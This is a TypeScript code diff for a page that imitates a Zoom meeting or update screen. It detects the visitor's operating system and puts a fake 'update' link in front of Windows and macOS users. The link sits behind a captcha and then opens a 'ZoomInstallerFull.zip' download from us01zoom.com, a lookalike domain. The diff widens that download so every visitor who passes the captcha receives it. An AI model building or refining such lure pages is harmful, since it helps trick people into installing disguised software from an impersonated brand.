@@ -6,10 +6,12 @@ declare global {
 	}
 }
 
-const textPhone = document.getElementById('hidden-text-phone') as HTMLParagraphElement
-const textLinux = document.getElementById('hidden-text-linux') as HTMLParagraphElement
+const textBad = document.getElementById('hidden-text-bad') as HTMLParagraphElement
 const captchaText = document.getElementById('captcha-text') as HTMLParagraphElement
-const protectedForm = document.getElementById('protected-form') as HTMLFormElement
+const updateLink = document.getElementById('update-link') as HTMLAnchorElement
+const meetingBtn = document.getElementById('meeting-btn') as HTMLButtonElement
+const hiddenText = document.getElementById('hidden-text-good') as HTMLParagraphElement
+const tos = document.getElementById('tos') as HTMLHeadingElement
 
 const osCategory: string = getOSCategory()
 
@@ -40,7 +42,26 @@ function getOSCategory() {
 	return 'Other OS';
 }
 
-protectedForm.addEventListener("submit", async function(e) {
+meetingBtn.addEventListener('click', function() {
+
+	tos.style.display = 'none'
+
+	meetingBtn.style.opacity = '0.65'
+	meetingBtn.style.pointerEvents = 'none'
+	meetingBtn.style.cursor = 'not-allowed'
+
+	if (osCategory.includes("Windows") || osCategory.includes("macOS")) {
+		hiddenText.style.display = 'block'
+		return
+	} else if (osCategory.includes("Linux")) {
+		textBad.style.display = 'block'
+		return
+	} else {
+		textBad.style.display = 'block'
+	}
+})
+
+updateLink.addEventListener('click', async function(e) {
 	e.preventDefault();
 
 	const token = window.turnstile.getResponse();
@@ -52,10 +73,10 @@ protectedForm.addEventListener("submit", async function(e) {
 
 	captchaText.style.display = "none"
 
-	const form = e.target as HTMLFormElement;
-	const formData = new FormData(form);
+	const formData = new FormData();
+	formData.append('cf-turnstile-response', token)
 
-	const response = await fetch(form.action, {
+	const response = await fetch('/verify-captcha', {
 		method: 'POST',
 		body: formData,
 	});
@@ -63,13 +84,8 @@ protectedForm.addEventListener("submit", async function(e) {
 	const result = await response.json();
 
 	if (result.success) {
-		if (osCategory != 'Windows' && osCategory != 'macOS < 15' && osCategory != 'macOS >= 15' && osCategory != "Linux") {
-			textPhone.style.display = 'block'
-		} else if (osCategory == "Linux") {
-			textLinux.style.display = 'block'
-		} else {
-			const downloadUrl = `https://us01zoom.com/download/ZoomInstallerFull.zip?token=${encodeURIComponent(result.token)}`;
-			window.open(downloadUrl, '_blank')
-		}
+		const downloadUrl = `https://us01zoom.com/download/ZoomInstallerFull.zip?token=${encodeURIComponent(result.token)}`;
+		window.open(downloadUrl, '_blank')
 	}
 })
+
